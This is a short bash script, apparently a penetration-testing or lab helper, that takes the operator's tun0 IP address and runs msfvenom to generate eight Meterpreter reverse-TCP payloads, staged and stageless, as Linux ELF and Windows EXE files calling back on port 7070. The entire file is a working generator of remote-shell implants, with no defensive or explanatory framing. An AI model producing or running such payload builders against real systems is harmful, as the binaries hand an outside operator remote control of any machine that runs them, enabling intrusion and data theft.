echo "[*] Running mkvenom payload generator"

# customizable variables
export LPORT="7070"
export OUTPUT_DIR="payloads"

# create the output directory if it doesn't exist
if [ ! -d $OUTPUT_DIR ]; then
  mkdir $OUTPUT_DIR
  echo "[*] Created output directory = $OUTPUT_DIR"
else
  echo "[*] Output directory already exists = $OUTPUT_DIR"
fi

# retrieve the IP for tun0 - TODO: to be adjusted
export IPADDR=`ip -brief address show tun0 | awk '{print $3}' | awk -F/ '{print $1}'`
echo "[*] IPADDR = $IPADDR"

# generate payloads with IP
echo "[*] Generating payloads..."
# TODO: check the CLI args for platform type
# linux stageless reverse TCP
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux_86_ns_meterpeter_reverse_tcp.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux_64_ns_meterpeter_reverse_tcp.elf
# linux staged reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux_86_meterpeter_reverse_tcp.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux_64_meterpeter_reverse_tcp.elf
# windows stageless reverse TCP
msfvenom -p windows/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe -o $OUTPUT_DIR/windows_86_ns_meterpeter_reverse_tcp.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe -o $OUTPUT_DIR/windows_64_ns_meterpeter_reverse_tcp.exe
# windows staged reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe -o $OUTPUT_DIR/windows_86_meterpeter_reverse_tcp.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe -o $OUTPUT_DIR/windows_64_meterpeter_reverse_tcp.exe

echo "[*] Done."
